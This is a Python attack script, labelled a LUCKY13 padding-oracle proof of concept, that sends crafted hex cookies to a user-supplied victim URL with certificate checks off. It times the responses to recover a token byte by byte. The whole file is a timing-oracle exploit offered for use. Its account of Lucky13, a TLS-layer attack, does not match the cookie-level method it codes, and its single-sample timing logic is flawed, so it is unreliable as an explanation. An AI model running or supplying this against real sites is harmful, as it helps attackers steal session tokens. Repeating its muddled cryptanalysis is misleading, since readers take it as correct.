import argparse
import binascii
import os
import time
from urllib.parse import urlparse

import requests
from urllib3 import disable_warnings
from urllib3.exceptions import InsecureRequestWarning

# Disable SSL warnings
disable_warnings(InsecureRequestWarning)


def validate_target_url(raw_url):
    """Validate a target URL before attempting a network request."""
    if raw_url is None:
        raise ValueError("Target URL is required. Use --target https://example.com or set LUCKY13_TARGET.")

    target = raw_url.strip()
    if not target:
        raise ValueError("Target URL cannot be empty.")

    lowered = target.lower()
    placeholder_markers = ("entertargethere", "enterTargetHere", "enter-target-here")
    if any(marker in lowered for marker in placeholder_markers):
        raise ValueError(
            "The value 'enterTargetHere' is just a placeholder. Replace it with a real target URL, "
            "for example: --target https://example.com"
        )

    parsed = urlparse(target)
    if parsed.scheme not in ("http", "https") or not parsed.netloc:
        raise ValueError(f"Invalid target URL: {target}. Provide a valid http(s) URL.")

    return target


def get_target_url():
    parser = argparse.ArgumentParser(description="LUCKY13 padding oracle proof of concept")
    parser.add_argument(
        "--target",
        default=os.environ.get("LUCKY13_TARGET"),
        help="Victim URL, e.g. https://example.com"
    )
    args = parser.parse_args()

    if not args.target:
        raise ValueError(
            "No target URL provided. Run with --target https://target.example or set LUCKY13_TARGET."
        )

    return validate_target_url(args.target)


def create_payload(token_position, known_bytes):
    """Create properly encoded CBC padding test payload"""
    prefix = b'A' * (16 - token_position)
    known_part = bytes([k ^ (16-token_position) for k in known_bytes])
    
    # Return raw bytes for hex representation
    return prefix + known_part

def test_byte(guess, prefix, known_part, target_url):
    """Test a single byte guess"""
    try:
        # Build cookie with proper encoding
        payload = prefix + bytes([guess]) + known_part
        cookie_value = binascii.hexlify(payload).decode('ascii')

        headers = {
            "Cookie": f"test={cookie_value}",  # Using hex representation
            "User-Agent": "LUCKY13-TEST/1.0"
        }

        start = time.time()
        requests.get(
            target_url,
            headers=headers,
            verify=False,
            timeout=3
        )
        elapsed = time.time() - start

        return elapsed

    except Exception as e:
        print(f"Error testing byte {guess}: {str(e)}")
        return None

def decrypt_byte(token_position, known_bytes, target_url):
    """Attempt to decrypt one byte"""
    prefix, known_part = create_payload(token_position, known_bytes)[:16-token_position], create_payload(token_position, known_bytes)[16-token_position:]

    print(f"[*] Testing position {token_position} with {len(known_bytes)} known bytes")

    candidates = []
    for guess in range(256):
        elapsed = test_byte(guess, prefix, known_part, target_url)
        if elapsed is not None:
            candidates.append((guess, elapsed))

    if not candidates:
        return None

    # Return byte with shortest response time (valid padding)
    candidates.sort(key=lambda x: x[1])
    return candidates[0][0]


if __name__ == "__main__":
    try:
        target_url = get_target_url()
    except ValueError as exc:
        raise SystemExit(f"ERROR: {exc}")

    print("[*] Starting LUCKY13 POC ")
    print("[!] This will take approximately 5-10 minutes per byte")
    print(f"[*] Target: {target_url}")

    known_bytes = []
    for position in range(1, 17):
        byte = decrypt_byte(position, known_bytes, target_url)
        if byte is None:
            print(f"[-] Failed at position {position}")
            break

        known_bytes.insert(0, byte)  # Insert at beginning (we decrypt backwards)
        current_token = bytes(known_bytes).hex()
        print(f"[+] Position {position}: 0x{byte:02x} | Current token: {current_token}")

    if known_bytes:
        print("\n[+] Final decrypted token:", bytes(known_bytes).hex())
    else:
        print("[-] Attack failed")